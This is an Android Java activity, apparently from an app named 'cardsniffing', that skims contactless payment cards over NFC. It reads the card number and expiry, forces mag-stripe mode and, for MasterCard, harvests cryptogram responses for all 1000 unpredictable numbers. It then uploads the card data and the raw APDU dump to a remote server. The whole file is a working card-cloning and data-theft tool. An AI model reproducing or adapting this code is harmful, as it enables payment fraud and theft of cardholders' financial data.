package com.ariel.cardsniffing;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.tech.IsoDep;
import android.nfc.tech.NfcA;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.CardView;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.ariel.cardsniffing.history.History;
import com.ariel.cardsniffing.model.Card;
import com.ariel.cardsniffing.model.Response;
import com.ariel.cardsniffing.network.RetrofitRequests;
import com.ariel.cardsniffing.network.ServerResponse;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Arrays;

import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;
import rx.subscriptions.CompositeSubscription;

import static com.ariel.cardsniffing.utils.Constants.CARD_EXP;
import static com.ariel.cardsniffing.utils.Constants.CARD_NUM;
import static com.ariel.cardsniffing.utils.Constants.CARD_TYPE;
import static com.ariel.cardsniffing.utils.Constants.FILE;

/*! Main Activity class with inner Card reading class*/

public class MainActivity extends AppCompatActivity {

    private NfcAdapter nfcAdapter;                                                              /*!< represents the local NFC adapter */
    private Tag tag;                                                                            /*!< represents an NFC tag that has been discovered */
    private IsoDep tagcomm;                                                                     /*!< provides access to ISO-DEP (ISO 14443-4) properties and I/O operations on a Tag */
    private String[][] nfctechfilter = new String[][]{new String[]{NfcA.class.getName()}};      /*!<  NFC tech lists */
    private PendingIntent nfcintent;                                                            /*!< reference to a token maintained by the system describing the original data used to retrieve it */
    private TextView cardType;                                                                  /*!< TextView representing type of card */
    private TextView progress;                                                                  /*!< TextView representing percentage of read data */
    private TextView cardNumber;                                                                /*!< TextView representing card number */
    private TextView cardExpiration;                                                            /*!< TextView representing card expiration */
    private CompositeSubscription mSubscriptions;
    private ServerResponse mServerResponse;
    private SharedPreferences mSharedPreferences;
    private RelativeLayout info;
    private CardView cardRL;
    private CardView cardRLinfo;
    private CardView cardRLem;
    private ImageView reload;
    private Card saveCard;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        /*!
            This method is where activity is initialized (13.56)
         */
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mSubscriptions = new CompositeSubscription();
        mServerResponse = new ServerResponse(findViewById(R.id.RL));
        mSharedPreferences = PreferenceManager.getDefaultSharedPreferences(this);
        nfcAdapter = NfcAdapter.getDefaultAdapter(this);
        nfcintent = PendingIntent.getActivity(this, 0, new Intent(this, getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0);//the activity will not be launched if it is already running at the top of the history stack
        initViews();
        if (!getData()) {
            initSharedPreferences();
        }
    }


    private void initViews() {
        Toolbar toolbar = findViewById(R.id.tool_bar);
        setSupportActionBar(toolbar);
        info = findViewById(R.id.RL);
        reload = findViewById(R.id.reload);
        cardRLem = findViewById(R.id.cardRLem);
        cardRL = findViewById(R.id.cardRL);
        cardRLinfo = findViewById(R.id.cardRLinfo);
        progress = findViewById(R.id.progress);
        cardType = findViewById(R.id.cardType);
        cardNumber = findViewById(R.id.cardNumber);
        cardExpiration = findViewById(R.id.cardExpiration);
        reload.setOnClickListener(view -> retryUpload());
    }

    private void retryUpload() {
        reload.setVisibility(View.GONE);
        newCardProcess(saveCard);
    }

    private void initSharedPreferences() {
        String type = mSharedPreferences.getString(CARD_TYPE, "");
        String num = mSharedPreferences.getString(CARD_NUM, "");
        String exp = mSharedPreferences.getString(CARD_EXP, "");
        if (!type.isEmpty()) {
            cardType.setText(type);
            cardNumber.setText(num);
            cardExpiration.setText(exp);
            info.setVisibility(View.GONE);
            cardRLem.setVisibility(View.VISIBLE);
            cardRL.setVisibility(View.VISIBLE);
        }
    }

    private void updateSharedPreferences(Card card) {
        SharedPreferences.Editor editor = mSharedPreferences.edit();
        editor.putString(CARD_EXP, card.getCardexpiration());
        editor.putString(CARD_TYPE, card.getCardtype());
        editor.putString(CARD_NUM, card.getCardnumber());
        editor.apply();
    }

    @Override
    public void onResume() {
        /*!
            This method is called when user returns to the activity
         */
        super.onResume();
        try {
            nfcAdapter.enableForegroundDispatch(this, nfcintent, null, nfctechfilter);//filter
        } catch (Exception e) {
            e.printStackTrace();
            AlertDialog.Builder dialog = new AlertDialog.Builder(MainActivity.this);
            dialog.setCancelable(false);
            dialog.setTitle("NFC Error");
            dialog.setMessage("NFC not working.");
            dialog.setPositiveButton("Exit", (dialog1, id) -> finish());
            final AlertDialog alert = dialog.create();
            alert.show();
        }
    }

    @Override
    public void onPause() {
        /*!
            This method disable reader mode (enable emulation) when user leave the activity
         */
        super.onPause();
        try {
            nfcAdapter.disableReaderMode(this);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        /*!
            This is called when NFC tag is detected
         */
        super.onNewIntent(intent);
        tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
        new CardReader().execute(tag);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mSubscriptions.unsubscribe();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_base, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        if (id == R.id.action_history) {
            showHistory();
            return true;
        }
        if (id == R.id.action_rm) {
            removeCard();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    private void removeCard() {
        reload.setVisibility(View.GONE);
        cardRLem.setVisibility(View.GONE);
        cardRL.setVisibility(View.GONE);
        cardRLinfo.setVisibility(View.GONE);
        info.setVisibility(View.VISIBLE);
        deleteFile(FILE);
        SharedPreferences.Editor editor = mSharedPreferences.edit();
        editor.putString(CARD_TYPE, "");
        editor.putString(CARD_NUM, "");
        editor.putString(CARD_EXP, "");
        editor.apply();
    }

    private void showHistory() {
        Intent intent = new Intent(this, History.class);
        startActivity(intent);
        finish();
    }

    private void newCardProcess(Card card) {
        mSubscriptions.add(RetrofitRequests.getRetrofit().newCard(card)
                .observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe(this::handleResponse, this::handleError));
    }

    private void handleError(Throwable throwable) {
        reload.setVisibility(View.VISIBLE);
        mServerResponse.handleError(throwable);
    }


    private void handleResponse(Response response) {
        reload.setVisibility(View.GONE);
    }

    private Boolean getData() {
        if (getIntent().getExtras() != null) {
            Card card = getIntent().getExtras().getParcelable("card");
            if (card != null) {
                setData(card);
                updateSharedPreferences(card);
                return true;
            }
            return false;
        }
        return false;
    }

    private void setData(Card card) {
        cardType.setText(card.getCardtype());
        cardNumber.setText(card.getCardnumber());
        cardExpiration.setText(card.getCardexpiration());
        info.setVisibility(View.GONE);
        cardRLem.setVisibility(View.VISIBLE);
        cardRL.setVisibility(View.VISIBLE);
        mServerResponse.downSnackBarMessage("Card data updated.");

        try {
            FileOutputStream fOut = openFileOutput(FILE, MODE_PRIVATE);
            OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
            myOutWriter.append(card.getFile());
            myOutWriter.close();
            fOut.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /*!
        Inner class that allows to preform card reading in background
        and publish results on the UI thread without having to manipulate threads and handlers
    */
    private class CardReader extends AsyncTask<Tag, String, String> {
        String cardtype = "Unknown";            /*!< string with card type */
        String cardnumber = "Unknown";          /*!< string with card number */
        String cardexpiration = "Unknown";      /*!< string with card expiration*/
        String error;                            /*!< string with error value */
        String file = "Unknown";

        @Override
        protected String doInBackground(Tag... params) {
            /*!
                This method performs background computation (Reading card data) that can take a long time ( up to 60-90 sec)
             */
            Tag tag = params[0];
            tagcomm = IsoDep.get(tag);
            try {
                tagcomm.connect();
            } catch (Exception e) {
                error = "Reading card data ... Error tagcomm: " + e.getMessage();
                e.printStackTrace();
                return null;
            }
            try {
                readCard();
                tagcomm.close();
            } catch (Exception e) {
                error = "Reading card data ... Error tranceive: " + e.getMessage();
                e.printStackTrace();
                return null;
            }
            return null;
        }

        private void readCard() {
            /*!
                This method reads all data from card to perform successful Mag-Stripe
                transaction and saves them to file(APDU).(Application Protocol Data Unit Command)
             */
            try {
                String temp;
                FileOutputStream fOut = openFileOutput(FILE, MODE_PRIVATE);
                OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                byte[] recv = transceive("00 A4 04 00 0E 32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00");

                myOutWriter.append(Byte2Hex(recv) + "\n");
                temp = "00 A4 04 00 07";
                temp += Byte2Hex(recv).substring(80, 102);
                temp += "00";

                if (temp.matches("00 A4 04 00 07 A0 00 00 00 04 10 10 00"))
                    cardtype = "MasterCard";
                else if (temp.matches("00 A4 04 00 07 A0 00 00 00 03 20 10 00"))
                    cardtype = "Visa Electron";
                else if (temp.matches("00 A4 04 00 07 A0 00 00 00 03 10 10 00"))
                    cardtype = "Visa";
                else if (temp.matches("00 A4 04 00 07 A0 00 00 00 25 01 04 00"))
                    cardtype = "American Express";
                else {
                    return;
                }

                recv = transceive(temp);
                myOutWriter.append(Byte2Hex(recv) + "\n");
                myOutWriter.append(toMagStripeMode() + "\n");
                recv = transceive("00 B2 01 0C 00");
                myOutWriter.append(Byte2Hex(recv) + "\n");

                if (cardtype == "MasterCard") {
                    cardnumber = new String(Arrays.copyOfRange(recv, 28, 44));
                    cardexpiration = new String(Arrays.copyOfRange(recv, 50, 52)) + "/" + new String(Arrays.copyOfRange(recv, 48, 50));

                    for (int i = 0; i < 1000; i++) {
                        recv = transceive("80 A8 00 00 02 83 00 00");
                        temp = "802A8E800400000";
                        temp += String.format("%03d", i);
                        temp += "00";
                        temp = temp.replaceAll("..(?!$)", "$0 ");
                        recv = transceive(temp);
                        myOutWriter.append(Byte2Hex(recv) + "\n");
                        if (i % 10 == 0) {
                            publishProgress(String.valueOf(i / 10));
                        }
                    }
                } else if (cardtype == "Visa" || cardtype == "Visa Electron") {
                    cardnumber = Byte2Hex(recv).substring(31, 38).replaceAll(" ", "");
                    cardexpiration = Byte2Hex(recv).substring(40, 43).replaceAll(" ", "") + "/" + Byte2Hex(recv).substring(37, 40).replaceAll(" ", "");
                } else if (cardtype == "American Express") {
                    cardnumber = Byte2Hex(recv).substring(92, 98).replaceAll(" ", "") + " " + Byte2Hex(recv).substring(98, 108).replaceAll(" ", "") +
                            " " + Byte2Hex(recv).substring(108, 115).replaceAll(" ", "");
                    cardexpiration = new String(Arrays.copyOfRange(recv, 7, 9)) + "/" + new String(Arrays.copyOfRange(recv, 5, 7));
                }

                myOutWriter.close();
                fOut.close();

            } catch (IOException e) {
                error = "Reading card data ... Error readCard: " + e.getMessage();
            }
        }


        protected byte[] transceive(String hexstr) throws IOException {
            /*!
                This method transceives all the data.
             */
            String[] hexbytes = hexstr.split("\\s");
            byte[] bytes = new byte[hexbytes.length];
            for (int i = 0; i < hexbytes.length; i++) {
                bytes[i] = (byte) Integer.parseInt(hexbytes[i], 16);
            }
            byte[] recv = tagcomm.transceive(bytes);
            return recv;
        }


        protected String Byte2Hex(byte[] input) {
        /*!
            This method converts bytes to strings of hex
         */
            StringBuilder result = new StringBuilder();
            for (Byte inputbyte : input) {
                result.append(String.format("%02X" + " ", inputbyte));
            }
            return result.toString();
        }

        protected String toMagStripeMode() {
            /*
                This method just returns card response with only Mag-Stripe mode support
                Stripe mode it issues Read Record commands to retrieve the data from
                the card which will cause the card to generate Dynamic CVC
             */
            return "770A820200009404080101009000";
        }

        protected void onProgressUpdate(String... percentage) {
            /*!
                Updates UI thread with progress
             */
            progress.setText("Reading card data ... " + percentage[0] + "%");
        }

        protected void onPreExecute() {
            /*!
                This method update UI thread before the card reading task is executed.
             */
            cardType.setText(cardtype);
            cardNumber.setText(cardnumber);
            cardExpiration.setText(cardexpiration);
            info.setVisibility(View.GONE);
            reload.setVisibility(View.GONE);
            cardRLem.setVisibility(View.VISIBLE);
            cardRL.setVisibility(View.VISIBLE);
            cardRLinfo.setVisibility(View.VISIBLE);

        }

        protected void onPostExecute(String result) {
            /*!
                This method update/display results of background card reading when the reading finishes.
             */
            progress.setText("Reading card data ... completed");
            if (error != null) {
                progress.setText(error);
                mServerResponse.downSnackBarMessage("Unable to read card.");
                return;
            }
            mServerResponse.downSnackBarMessage("Card data Extracted.");
            cardType.setText(cardtype);
            cardNumber.setText(cardnumber);
            cardExpiration.setText(cardexpiration);

            Card card = new Card();
            card.setCardtype(cardtype);
            card.setCardnumber(cardnumber);
            card.setCardexpiration(cardexpiration);

            notifyUser();
            updateSharedPreferences(card);
            tryAddCard(card);
        }

        private void notifyUser() {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            // Vibrate for 500 milliseconds
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && v != null) {
                v.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
            } else if (v != null) {
                v.vibrate(500);
            }
        }

        private void tryAddCard(Card card) {
            FileInputStream fIn = null;
            try {
                fIn = openFileInput(FILE);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            BufferedReader myReader = new BufferedReader(new InputStreamReader(fIn));
            try {
                file = myReader.readLine() + "\n";
                file += myReader.readLine() + "\n";
                file += myReader.readLine() + "\n";
                file += myReader.readLine() + "\n";

                String str;
                while ((str = myReader.readLine()) != null) {
                    file += str + "\n";
                }

                myReader.close();
                fIn.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            card.setFile(file);
            saveCard = card;
            newCardProcess(card);
        }
    }
}